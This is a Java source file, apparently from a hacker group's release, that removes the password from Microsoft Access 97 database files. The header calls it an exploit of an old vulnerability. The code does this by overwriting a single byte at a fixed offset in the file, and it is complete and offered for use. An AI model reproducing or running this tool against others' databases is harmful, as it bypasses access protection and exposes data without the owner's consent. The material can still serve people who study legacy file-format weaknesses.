/* axz.java by Wyzewun/Wizdumb [MDMA]
 * wizdumb@leet.org || www.effkay.za.net || wizdumb@IRC
 *
 * This program removes the passwords from Microsoft Access 97 files. This is
 * an old vulnerability, but I thought it would be fun to exploit it
 * differently to how everybody has up until now. (ie. By just nuking the
 * password instead of cracking it :-P) Enjoy!
 */
 
 import java.io.*;
 
 class axz {
  
  static void main(String[] args) throws IOException, FileNotFoundException {
    
    if (args.length != 1) {
      System.out.println("Syntax: java axz [filename]");
      System.exit(1); }
    
    RandomAccessFile blah = null;
    System.out.println("Microsoft Access 97 Password Remover by Wyzewun [wizdumb@leet.org]");
    
    try {
      blah = new RandomAccessFile(args[0], "rw");
    } catch (FileNotFoundException e) {
      System.out.println("File: " + args[0] + " is non-existant.");
      System.exit(1); }
    
    blah.seek(0x42);
    blah.writeByte(0x86);
    System.out.println("Password of " + args[0] + " removed."); } }